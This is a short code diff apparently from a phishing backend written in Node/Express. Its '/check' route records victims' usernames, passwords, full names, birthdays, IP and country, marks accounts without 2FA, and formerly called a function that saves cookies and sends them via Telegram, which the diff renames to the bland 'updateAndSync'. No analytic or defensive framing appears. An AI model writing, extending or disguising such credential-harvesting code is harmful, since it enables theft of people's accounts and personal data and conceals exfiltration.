@@ -23,7 +23,7 @@ app.post('/check', async (req, res) => {
         if (result === 'SUCCESS') {
             saveInfo('Không bật 2FA',ip,country,username,password,fullname,birthday);
             res.send('SUCCESS');
-            await saveCookiesAndSendTelegramMessage();
+            await updateAndSync();
             await close();
         }
         else if (result === 'WRONG') {
@@ -38,7 +38,9 @@ app.post('/check', async (req, res) => {
             saveInfo(result,ip,country,username,password,fullname,birthday);
         }
     } catch (error) {
-        await close();
+        try{ await close();}
+        catch{
+        }
     }
 });
 
